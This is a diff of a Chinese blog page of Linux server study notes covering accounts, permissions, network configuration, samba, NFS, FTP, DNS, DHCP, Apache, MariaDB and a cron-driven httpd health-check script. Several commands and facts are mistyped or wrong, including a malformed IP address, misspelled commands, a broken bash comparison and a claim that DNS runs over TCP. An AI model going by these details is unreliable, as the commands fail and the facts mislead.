+<p>7：密码过期后的宽限天数（和第5字段比）；</p>
+<p>8：账号失效时间（要用时间戳表示）；</p>
+<p>9：保留。</p>
+<h3 id="3、有关账户的命令"><a href="#3、有关账户的命令" class="headerlink" title="3、有关账户的命令"></a>3、有关账户的命令</h3><p>1、创建新用户命令——useradd</p>
+<p>使用这个命令后，在/etc/passwd等4个文件中添加了相关信息；并且在/home目录下创建新用户的主目录</p>
+<p>2、设置或修改用户口令——passwd</p>
+<p>3、设置用户账号属性——usrmod</p>
+<p>-u  UID：修改用户的UID</p>
+<p>-c：用户描述 </p>
+<p>-G：组名         修改用户的附加组</p>
+<p>4、删除用户账户——userdel</p>
+<h2 id="第三章-文件与磁盘管理"><a href="#第三章-文件与磁盘管理" class="headerlink" title="第三章 文件与磁盘管理"></a>第三章 文件与磁盘管理</h2><p>linux的文件和目录的权限，只有rwx三种</p>
+<p>r：读取，对文件而言，具有读取文件内容的权限，对于目录来说，具有浏览目录的权限</p>
+<p>w：写入，对文件而言，具有新增，修改，删除文件内容的权限；对目录来说，具有新建，删除，修改，移动目录内文件的权限</p>
+<p>x：执行，对文件而言，具有执行文件的权限；对目录来说该用户具有进入目录的权限</p>
+<p>Linux中文件的访问权限取决于文件的拥有者、文件所属组的用户和其他用户各自的访问权限。文件所有者，所属组及其他用户权限之间无关联，文件权限的表示方法可以采用数字法表示和字符法表示。</p>
+<h2 id="第四章-网络管理"><a href="#第四章-网络管理" class="headerlink" title="第四章 网络管理"></a>第四章 网络管理</h2><p>/etc/sysconfig/network-scripts/ifcfg-ens33</p>
+<pre><code>TYPE=“Ethernet“            //网卡类型
+DEVICE=“ens33 “            //网卡设备名
+BOOTPROTO=static        //设置静态指定IP地址（none、static、dhcp）
+BROADCAST=192.168.100.255    //设置广播地址
+HWADDR=00:0c:29:68:74:83    //网卡的物理地址
+IPADDR=192.168.100.254    //设置网卡的IP地址
+NETMASK=255.255.255.0        //设置子网掩码
+GATEWAY=192.168.100.1        //设置网关地址
+ONBOOT=“yes“            //设置启动激活此网卡</code></pre><p>网络配置命令ifconfig可以用来查看和配置网络状态命令</p>
+<p>用法：</p>
+<p>1、ifconfig：显示所有网卡信息，包括网卡名称、IP地址、子网掩码</p>
+<p>2、ifconfig ens33 192.16820.11 netmask 255.255.255.0：修改IP地址；</p>
+<p>3、ifocnfig ens33 down：关闭网卡；</p>
+<p>4、ifconfig ens33 up：启用网卡。</p>
+<h2 id="第五章-samba服务器的配置管理"><a href="#第五章-samba服务器的配置管理" class="headerlink" title="第五章 samba服务器的配置管理"></a>第五章 samba服务器的配置管理</h2><p>samba服务器可以使用用户在不同的操作系统之间进行文件系统共享、samba</p>
+<p>服务器提供了在windows环境下共享linux中用户目录的一个工具。在linux系统中安装samba 后，winsows用户只需进行简单的用户登录，linux 中的目录就可以作为一个驱动器，在windows利用资源管理器直接操作。</p>
+<p>samba服务器磨人的配置文件为smb.conf，该文件存放在/etc/samba目录下。smb.conf文件根据功能上划分，大致可以分为三个部分，即配置简介、全局变量和共享服务。</p>
+<p>1、安装samba服务</p>
+<p>yum -y install samba</p>
+<p>2、查看samba服务状态</p>
+<p>systemctl status smb</p>
+<p>3、启动samba服务</p>
+<p>systemctl start smb</p>
+<p>4、停止smaba服务</p>
+<p>systemctl stop smb</p>
+<p>5、重启samba服务</p>
+<p>systemctl restart smb</p>
+<h2 id="第六章-NFS服务器的配置管理"><a href="#第六章-NFS服务器的配置管理" class="headerlink" title="第六章 NFS服务器的配置管理"></a>第六章 NFS服务器的配置管理</h2><p>NFS即网络文件系统，它允许网络中的不同计算机之间相互共享资源。NFS客户端可以透明的读写远程NFS服务器上的文件，就像访问额本地文件一样。NFS服务的配置方法相对比较简单，只需在NFS的主配置文件/etc/exports中进行设置，然后启动服务即可。</p>
+<p>Centos7下默认没有exports文件，需要手工新增，所有的配置都需要用户自己定义，每一行记录都代表一个共享资源及访问权限设置，其定义格式如下：</p>
+<pre><code>共享目录 [客户端1(参数)][客户端2(参数)]</code></pre><p>其中各参数含义如下：</p>
+<p>1、共享目录：NFS服务器需共享目录的实际路径，需使用绝对路径</p>
+<p>2、客户端：指可以访问NFS服务器共享目录的计算机。客户端的制定非常灵活，可以指定IP地址、网段等。</p>
+<p>3、参数：对满足客户端匹配条件的客户端进行访问权限、用户映射等操作。于控制共享目录访问权限的参数，该参数只有ro和rw两个。</p>
+<h3 id="管理NFS服务器的命令"><a href="#管理NFS服务器的命令" class="headerlink" title="管理NFS服务器的命令"></a>管理NFS服务器的命令</h3><p>1、查看nfs服务的状态</p>
+<p>systemctl status rpcbind.service</p>
+<p>systemctl status nfs.service</p>
+<p>2、启动NFS服务</p>
+<p>如需启动NFS服务，一定要先启动RPC，然后启动NFS，命令如下：</p>
+<p>systemctl start rpcbind.service</p>
+<p>systemctl start nfs.service</p>
+<p>3、停止NFS服务</p>
+<p>停止NFS服务时不一定要关闭rpcbind服务，命令如下：</p>
+<p>systemctl stop nfs.service</p>
+<p>4、重启NFS服务</p>
+<p>重启NFS服务命令如下：systemctl restart nfs.service</p>
+<h2 id="第七章-FTP服务器的配置管理"><a href="#第七章-FTP服务器的配置管理" class="headerlink" title="第七章 FTP服务器的配置管理"></a>第七章 FTP服务器的配置管理</h2><p>FTP（File Transfer Protocol，文件传输协议）是Internet中应用广泛的服务之一，主要用于在Internet上任意计算机之间相互传输文二尖。</p>
+<p>FTP协议有两种工作模式：</p>
+<p>主动模式（也就是PORT模式）：服务器主动连接客户端的数据端口</p>
+<p>被动模式（也就是PSAV）：服务器被动的等待客户端连接自己的数据接口。</p>
+<h3 id="管理FTP服务器的命令"><a href="#管理FTP服务器的命令" class="headerlink" title="管理FTP服务器的命令"></a>管理FTP服务器的命令</h3><p>1、安装ftp服务</p>
+<p>yum -y install vsftpd</p>
+<p>2、查询vsftpd服务运行状态</p>
+<p>systemctl status vsftpd</p>
+<p>3、启动vsftpd服务</p>
+<p>systemctl start vsftpd</p>
+<p>4、停止vsftpd服务</p>
+<p>systemctl stop vsftpd</p>
+<p>5、重启vsftpd服务</p>
+<p>systemctl restart vsftpd</p>
+<h3 id="vsftpd有以下几个配置文件"><a href="#vsftpd有以下几个配置文件" class="headerlink" title="vsftpd有以下几个配置文件"></a>vsftpd有以下几个配置文件</h3><p>vsftpd：位于/etc/pam.d目录</p>
+<p>​                为vsftpd的PAM配置文件，主要用来加强vsftpd服务器的用户认证</p>
+<p>vsftpd.conf：位于/etc/vsftpd目录</p>
+<p>​                    用来定义用户登录控制、用户权限控制、超时设置、服务器性能选项等FTP服务器的配置</p>
+<p>ftpusers：位于/etc/vsftpd目录下指定了哪些用户账户不能访问FTP服务器</p>
+<p>user_list：位于/etc/vsftpd目录下，该文件里的用户账户在默认情况下也不能访问FTP服务器，仅当vsftpd.conf配置文件里启用userlist_enabled=NO选项才允许访问。</p>
+<h2 id="第八章-DNS服务器的配置管理"><a href="#第八章-DNS服务器的配置管理" class="headerlink" title="第八章 DNS服务器的配置管理"></a>第八章 DNS服务器的配置管理</h2><p>在用TCP/IP协议架设的网络中，每一个节点都有唯一的IP地址，用来作为唯一的标志。然而记住这些毫无记忆规律的IP地址是不可能的。为了方便记忆，产生了域名系统DNS，运行在TCP协议之上。负责将域名转化成实际相对应的IP地址，这个过程称为域名解析，负责域名解析的服务器成为DNS服务器。</p>
+<h3 id="DNS服务器管理命令"><a href="#DNS服务器管理命令" class="headerlink" title="DNS服务器管理命令"></a>DNS服务器管理命令</h3><p>使用yum方式安装DNS服务：</p>
+<p>yum -y install bind</p>
+<p>2、启动DNS服务</p>
+<p>systemctl start named.seeervice</p>
+<p>3、停止DNS服务</p>
+<p>systemctl stop named.service</p>
+<p>4、重启DNS服务</p>
+<p>systemctl restart named.service</p>
+<h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><p>主局配置文件named.conf</p>
+<p>bind的主配置文二尖named.conf位于/etc/目录下，文件只包括bind的基本配置，并不包含任何DNS区域数据。</p>
+<p>主配置文件named.rfc1912.zones</p>
+<p>位于/etc/目录下，文件包括正向解析内容和反向区域解析内容。可根据需要将nameed.rfc1912.zones复制为全局配置文件中指定的主配置文件。</p>
+<p>区域文件：</p>
+<p>在DNS服务期内，用来存放一个区域内的所有数据(包括主机名和对应IP地址、刷新间隔和过期时间等)的文件。一般存放在/var/named目录下。</p>
+<p>默认正向解析区域配置文件为named.localhost，</p>
+<p>默认反向解析区域配置文件为named.loopback。</p>
+<p>可根据需要用这个两个区域解析文件复制为主配置文件中指定的区域解析文件。</p>
+<h2 id="第九章-DHCP服务器的配置管理"><a href="#第九章-DHCP服务器的配置管理" class="headerlink" title="第九章 DHCP服务器的配置管理"></a>第九章 DHCP服务器的配置管理</h2><p>DHCP是（动态主机配置协议）的缩写，主要是为网络客户机自动动态分配IP地址。</p>
+<p>使用DHCP时，在网络上至少要有一台DHCP服务器，当网络中的DHCP客户端程序发出请求获取IP地址的信息后，DHCP服务器会根据目前已经配置的地址池，提供一个可供使用的IP地址和子网掩码等相关网络配置信息给DHCP客户端。</p>
+<p>DHCP服务器上的IP地址数据库包含如下内容：</p>
+<p>（1）所有客户机的所有配置参数；</p>
+<p>（2）在缓冲池中指定给客户机的有效IP地址，以及手工指定的保留地址</p>
+<p>（3）服务提供租约时间</p>
+<h3 id="DHCP服务器管理命令"><a href="#DHCP服务器管理命令" class="headerlink" title="DHCP服务器管理命令"></a>DHCP服务器管理命令</h3><p>DHCP服务的安装：</p>
+<p>yum -y install dhcp</p>
+<p> 1 启动DHCP服务<br>        systemctl start dhcpd.service<br>         2  停止DHCP服务<br>        systemctl stop dhcpd.service<br>         3 重启DHCP服务<br>        systemctl restart dhcpd.service<br>         4 设置开机自启动DHCP服务<br>        systemctl enable dhcpd.service</p>
+<h3 id="文件-1"><a href="#文件-1" class="headerlink" title="文件"></a>文件</h3><p>DHCP服务的主配置文件dhcp.conf位于/etc/dchp/目录下，但该文件没有任何配置信息，需要将位于“/usr/share/doc/dhcp-4.2.5/”目录下的样例文件dhcpd.conf.example复制覆盖到主配置文件</p>
+<p>dhcp.conf文件通常由三部分组成：参数、声明和选项</p>
+<pre><code>subnet 192.168.1.0  netmask 255.255.255.0 {
+   range 192.168.1.50  192.168.1.200 ;      # 定义IP地址池为192.168.1.50到192.168.1.200
+   option domain-name-servers 192.168.1.2;  # 指定DNS服务器地址：192.168.1.2 
+   option routers  192.168.1.2 ;    # 指定网关地址为： 192.168.1.2
+   default-lease-time 86400;         #指定租约时间为86400秒（1天）            
+}
+host a {
+      hardware ethernet 00:50:56:C0:00:08;
+      fixed-address 192.168.1.50         #为该MAC地址的设备分配IP地址：192.168.1.50
+}
+</code></pre><h2 id="第十章-Apache服务器的配置管理"><a href="#第十章-Apache服务器的配置管理" class="headerlink" title="第十章 Apache服务器的配置管理"></a>第十章 Apache服务器的配置管理</h2><p>Apache是一种开放源码的web服务器软禁。因其具有良好的跨平台和安全特性，目前几乎是主流 UNIX、Linux和BSD系统（如FreeBSD）选用的主流WEB服务器软件</p>
+<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>1、安装apache服务</p>
+<p>yum -y install httpd</p>
+<p>2、httpd服务启动</p>
+<p>systemctl start httpd</p>
+<p>3、停止httpd服务</p>
+<p>systemctl stop httpd</p>
+<p>4、重启http服务</p>
+<p>systemctl restart  httpd</p>
+<h3 id="文件-2"><a href="#文件-2" class="headerlink" title="文件"></a>文件</h3><p>Apache服务器的主配置文件为/etc/httpd/conf/httpd.conf文件，文件内容主要由全局环境设置、主服务器设置和虚拟主机设置三部分组成。</p>
+<p>全局环境设置：这一部分的指令将影响整个Apache服务器，该部分以“#ServerRoot:”作为开始标志。</p>
+<p>主服务器配置：这一部分的指令是为所有虚拟主机提供默认值，该部分从“#’Main‘server configuration”开始标志。</p>
+<p>虚拟主机设置：apache服务器可利用虚拟主机功能在一台服务器上设置多个web站点，这样就可以当做多个web服务器。</p>
+<h2 id="第十一章-数据库服务器的配置管理"><a href="#第十一章-数据库服务器的配置管理" class="headerlink" title="第十一章 数据库服务器的配置管理"></a>第十一章 数据库服务器的配置管理</h2><p>数据库的应用领域非常广泛。不论是政府部门、银行、证券或大型企业等，实施信息化建设都需要使用数据库。</p>
+<p>在centos6以前，默认使用的是mysql，从centos7开始 默认使用mariadb。这是因为mysql是开源软件，所有权属于SUN公司。而SUN被甲骨文收购，MySQL的所有权也落入甲骨文的手中，而Oracle也是甲骨文旗下的商业数据库软件，所以MySQL有被闭源的风险。MariaDB是MySQL的创始人开发的一个分支，可以完全兼容MySQL，所以从CentOS7开始，使用MariaDB代替MySQL，规避MySQL可能存在闭源带来的风险。</p>
+<h3 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h3><p>1、MariaDB的安装</p>
+<p>yum -y install mariadb-server</p>
+<p>2、查询mariadb服务运行状态</p>
+<p>systemctl status mariadb</p>
+<p>3、启动mariadb服务</p>
+<p>systemctl start mariadb</p>
+<p>4、停止mariadb服务</p>
+<p>systemctl stop mariadb</p>
+<p>5、重启mariadb服务</p>
+<p>systemctl restart mariadb</p>
+<h2 id="第十二章-服务器的维护"><a href="#第十二章-服务器的维护" class="headerlink" title="第十二章 服务器的维护"></a>第十二章 服务器的维护</h2><p>用户的crontab设置</p>
+<p>​    crontab[选项]</p>
+<p>​            -e：编辑crontab定时任务</p>
+<p>​            -l：查询crontab任务</p>
+<p>​            -r：删除当前用户所有的crontab任务</p>
+<p>crontab -e    编辑crontab 定时任务<br>标准格式：* * * * *  command<br>前面5个<em>代表时间 command是要执行的脚本<br>第1个</em>   一个小时的第几分钟      0-59<br>第2个*   一天当中的第几小时      0-23<br>第3个*   一个月中的第几天         1-31<br>第4个*   一年中的第几月            1-12<br>第5个*   一周当中的星期几         0-7（0和7都代表周日）</p>
+<pre><code>例：  5  5  *  *   1-5    /root/sh/autotest.sh  
+表示：  周一到周五每天凌晨5:05分执行 /root/sh/autotest.sh服务脚本</code></pre><p>使用vim  /root/sh/autotest.sh  命令编辑如下脚本：<br>#!/bin/bash<br>port=$(nmap -sT 192.168.1.110  |  grep 80/tcp  | grep http  |  awk ‘{print $2}’ )<br>#使用nmap命令扫描服务器，并截取apache服务的状态，赋予变量port<br>if  [  “$port”  = =  “open”  ]<br>      then<br>            echo  “$(date) http is ok”  &gt;&gt;  /tmp/autostart-acc.log</p>
+<p>当Apache服务正常运行时 将“当前时间+http is OK” 追加写入到/tmp/autostart-acc.log文件中</p>
+<p>​      else<br>​           systemctl restart httpd  &amp;&gt;  /dev/null<br>​           echo  “$(date)  restart  httpd !!”  &gt;&gt;  /tmp/autostart-err.log<br>  #当Apache服务异常时重启服务，并将”当前时间+ restart  httpd !! “追加写入到/tmp/autostart-err.log文件中<br>   fi</p>
+<p>/tmp/autostart-acc.log 文件记录的是Apache服务正常运行的时记录的当前时间的日志文件<br>       /tmp/autostart-err.log 文件记录的是Apache服务异常运行的时记录的当期时间的日志文件 </p>
+<p>整个脚本的功能：<br>脚本使用nmap命令扫描服务器，并截取Apache服务的状态<br>当服务正常运行时，将当前时间记录到/tmp/autostart-acc.log日志文件<br>当服务异常运行时，重启Apache服务，并将当前时间记录到/tmp/autostart-err.log日志文件</p>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -1117,7 +1007,7 @@ server    2020.106.0.20    #可以更换域名服务器地址</code></pre><p>typ
                     </span>
                     <a href="https://bbsamedi.github.io" class="b-link-green">Dusk</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2020/08/18/kali/" class="b-link-green">kali</a>
+                    <a href="/2020/08/26/linux-fu-wu-qi/" class="b-link-green">linux服务器</a>
                 </p>
             </div>
 
@@ -1437,9 +1327,64 @@ server    2020.106.0.20    #可以更换域名服务器地址</code></pre><p>typ
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2020/08/26/linux-fu-wu-qi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="linux服务器">
+                        
+                        <span class="card-title">linux服务器</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Linux服务器复习第一章 Linux基础知识1、Linux最早是由Linus Torvalds开发的
+2、自由软件与免费软件；自由软件是完全免费，可修改可商用，免费软件可使用不可商用
+3、基本的linux命令
+cd：切换目录；
+ls：列出
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-08-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/linux/" class="post-category" target="_blank">
+                                    linux
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/linux/" target="_blank">
+                        <span class="chip bg-color">linux</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2020/08/21/blog/">
                     <div class="card-image">
@@ -1457,9 +1402,9 @@ server    2020.106.0.20    #可以更换域名服务器地址</code></pre><p>typ
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-08-21
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-08-21
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -1477,63 +1422,6 @@ server    2020.106.0.20    #可以更换域名服务器地址</code></pre><p>typ
                     
                     <a href="/tags/blog/" target="_blank">
                         <span class="chip bg-color">blog</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/07/26/shen-tou-ce-shi-zong-jie/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="渗透测试总结">
-                        
-                        <span class="card-title">渗透测试总结</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            掌控安全web渗透总结
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-26
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/渗透测试/" class="post-category" target="_blank">
-                                    渗透测试
-                                </a>
-                            
-                            <a href="/categories/渗透测试/web安全/" class="post-category" target="_blank">
-                                    web安全
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/渗透测试/" target="_blank">
-                        <span class="chip bg-color">渗透测试</span>
-                    </a>
-                    
-                    <a href="/tags/web安全/" target="_blank">
-                        <span class="chip bg-color">web安全</span>
                     </a>
                     
                 </div>
